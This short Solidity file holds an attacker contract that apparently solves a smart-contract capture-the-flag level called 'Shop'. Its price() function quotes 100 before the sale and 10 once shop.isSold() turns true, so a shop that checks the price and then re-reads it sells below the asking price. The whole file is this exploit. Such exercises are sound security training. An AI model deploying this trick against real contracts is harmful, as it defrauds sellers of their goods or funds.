// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract Buyer {
    Shop shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function price() external view returns (uint256) {
        return !shop.isSold() ? 100 : 10;
    }

    function hax() external {
        shop.buy();
    }
}
